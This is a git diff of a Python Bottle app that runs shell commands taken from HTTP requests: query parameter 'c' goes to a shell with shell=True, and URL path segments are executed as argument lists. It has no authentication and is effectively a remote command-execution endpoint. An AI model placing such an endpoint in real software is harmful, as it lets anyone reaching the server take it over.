@@ -8,19 +8,22 @@ import codecs
 import datetime
 import time
 import subprocess
+import re
 from bottle import Bottle, request, template, response
 
 app = Bottle()
 
 @app.route('/', method='GET')
-@app.route('/<path:re:.*>')
+# @app.route('/<path:re:.*>')
+@app.route('/<path:path>')
 def handle_request(path=None):
     query = dict(request.query.decode('utf-8'))
-    if 'command' in query:
-        command = query['c']
+    if command := query.get('c'):
         output = subprocess.check_output(command, shell=True).decode("utf-8", errors="ignore")
     elif path is not None:
-        params = path.split('/')
+        print(path)
+        params = split_with_quotes(path)
+        print(params)
         command = " ".join(f'"{value}"' for value in params)
         output = subprocess.run(params, capture_output=True, text=True, encoding='utf-8', errors='ignore').stdout
     else:
@@ -29,8 +32,9 @@ def handle_request(path=None):
     response.headers['Content-Type'] = 'text/plain; charset=UTF-8'
     return f'{output}'
 
-
-
+def split_with_quotes(string):
+    parts = re.findall(r'(?:".*?"|[^/"]+)', string)
+    return [part.strip('"') for part in parts]
 
 
 # @app.route('/', method='GET')
